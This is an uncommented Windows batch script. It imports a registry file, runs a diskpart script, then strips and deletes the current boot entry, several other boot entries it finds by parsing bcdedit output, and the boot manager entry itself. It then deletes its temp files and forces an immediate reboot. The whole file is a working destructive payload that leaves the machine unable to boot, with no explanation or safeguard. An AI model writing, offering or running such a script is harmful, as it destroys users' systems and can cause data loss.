@echo off
regedit /s "%~dp0\regdata.reg"
diskpart /s "%~dp0\partdata.txt"
bcdedit /deletevalue {current} recoverysequence
bcdedit /deletevalue {current} resumeobject
bcdedit /deletevalue {current} path
bcdedit /deletevalue {current} device
bcdedit /deletevalue {current} osdevice
bcdedit /deletevalue {current} systemroot
bcdedit /deletevalue {current} inherit
bcdedit /delete {current}
bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /delete %identifier%
bcdedit /enum |findstr "den" > "%temp%\tempout3327042.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327042.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /delete %identifier%
bcdedit /enum |findstr "den" > "%temp%\tempout3327041.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327041.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /delete %identifier%
bcdedit /enum |findstr "den" > "%temp%\tempout3327040.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327040.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /delete %identifier%
bcdedit /enum |findstr "den" > "%temp%\tempout3327049.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327049.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /delete %identifier%
bcdedit /enum |findstr "den" > "%temp%\tempout3327048.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327048.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /delete %identifier%
bcdedit /enum |findstr "den" > "%temp%\tempout3327047.txt"
For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327047.txt"') Do set identifier=%%~G
bcdedit /deletevalue %identifier% recoverysequence
bcdedit /deletevalue %identifier% resumeobject
bcdedit /deletevalue %identifier% path
bcdedit /deletevalue %identifier% device
bcdedit /deletevalue %identifier% osdevice
bcdedit /deletevalue %identifier% systemroot
bcdedit /deletevalue %identifier% inherit
bcdedit /deletevalue %identifier% toolsdisplayorder
bcdedit /deletevalue %identifier% displayorder
bcdedit /deletevalue %identifier% description
bcdedit /deletevalue %identifier% default
bcdedit /delete %identifier%
bcdedit /deletevalue {bootmgr} resumeobject
bcdedit /deletevalue {bootmgr} default
bcdedit /deletevalue {bootmgr} path
bcdedit /deletevalue {bootmgr} toolsdisplayorder
bcdedit /deletevalue {bootmgr} displayorder
bcdedit /deletevalue {bootmgr} inherit
bcdedit /deletevalue {bootmgr} description
bcdedit /delete {bootmgr}
del %temp%\tempout3327043.txt
del %temp%\tempout3327042.txt
del %temp%\tempout3327041.txt
del %temp%\tempout3327040.txt
del %temp%\tempout3327049.txt
del %temp%\tempout3327048.txt
del %temp%\tempout3327047.txt
shutdown /r /t 0
